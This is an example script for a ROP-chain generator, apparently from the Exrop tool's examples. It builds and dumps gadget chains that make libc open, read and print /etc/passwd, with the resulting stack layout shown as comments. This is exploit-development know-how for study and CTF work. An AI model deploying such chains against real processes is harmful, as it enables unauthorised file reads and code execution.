"""Example: open('/etc/passwd', 0) → read(fd, bss, 0x100) → write(1, bss, 0x100).

Demonstrates func_call with string arguments and register forwarding ('rax').

Usage:
    PYTHONPATH=. python3 examples/open-read-write.py
"""

from pwn import *
from Exrop import Exrop

binname = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()

rop = Exrop(binname)
rop.find_gadgets(cache=True)
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("read('rax', bss, 0x100)") # register can be used as argument too!
chain = rop.func_call(read, ('rax', bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("done")

# Output:
# open('/etc/passwd', 0)
# $RSP+0x0000 : 0x00007ffff7af4981 # pop r12 ; ret
# $RSP+0x0008 : 0x00000000002046e0
# $RSP+0x0010 : 0x00007ffff7a3c4d9 # pop r13 ; ret
# $RSP+0x0018 : 0x00007ffff7af4a7d
# $RSP+0x0020 : 0x00007ffff7b35227 # mov r8, r12 ; mov rdi, r14 ; call r13: next -> (0x00110a7d) # pop rsi ; ret
# $RSP+0x0028 : 0x00007ffff7af4a7d # pop rsi ; ret
# $RSP+0x0030 : 0x7361702f6374652f
# $RSP+0x0038 : 0x00007ffff7a940a7 # mov qword ptr [r8], rsi ; ret
# $RSP+0x0040 : 0x00007ffff7af4981 # pop r12 ; ret
# $RSP+0x0048 : 0x00000000002046e8
# $RSP+0x0050 : 0x00007ffff7a3c4d9 # pop r13 ; ret
# $RSP+0x0058 : 0x00007ffff7af4a7d
# $RSP+0x0060 : 0x00007ffff7b35227 # mov r8, r12 ; mov rdi, r14 ; call r13: next -> (0x00110a7d) # pop rsi ; ret
# $RSP+0x0068 : 0x00007ffff7af4a7d # pop rsi ; ret
# $RSP+0x0070 : 0x0000000000647773
# $RSP+0x0078 : 0x00007ffff7a940a7 # mov qword ptr [r8], rsi ; ret
# $RSP+0x0080 : 0x00007ffff7af378b # pop rdi ; ret
# $RSP+0x0088 : 0x00000000002046e0
# $RSP+0x0090 : 0x00007ffff7af4a7d # pop rsi ; ret
# $RSP+0x0098 : 0x0000000000000000
# $RSP+0x00a0 : 0x000000000011b150
#
# read('rax', bss, 0x100)
# $RSP+0x0000 : 0x00007ffff7a3c6e4 # pop rbx ; ret
# $RSP+0x0008 : 0x00007ffff7af4a7d
# $RSP+0x0010 : 0x00007ffff7ac2942 # mov rdi, rax ; call rbx: next -> (0x00110a7d) # pop rsi ; ret
# $RSP+0x0018 : 0x00007ffff7af4a7d # pop rsi ; ret
# $RSP+0x0020 : 0x00000000002046e0
# $RSP+0x0028 : 0x00007ffff7a9905c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# $RSP+0x0030 : 0x0000000000000100
# $RSP+0x0038 : 0x0000000000000000
# $RSP+0x0040 : 0x0000000000000000
# $RSP+0x0048 : 0x0000000000000000
# $RSP+0x0050 : 0x0000000000000000
# $RSP+0x0058 : 0x000000000011ba80
#
# write(1, bss, 0x100)
# $RSP+0x0000 : 0x00007ffff7af378b # pop rdi ; ret
# $RSP+0x0008 : 0x0000000000000001
# $RSP+0x0010 : 0x00007ffff7af4a7d # pop rsi ; ret
# $RSP+0x0018 : 0x00000000002046e0
# $RSP+0x0020 : 0x00007ffff7a9905c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
# $RSP+0x0028 : 0x0000000000000100
# $RSP+0x0030 : 0x0000000000000000
# $RSP+0x0038 : 0x0000000000000000
# $RSP+0x0040 : 0x0000000000000000
# $RSP+0x0048 : 0x0000000000000000
# $RSP+0x0050 : 0x000000000011c590
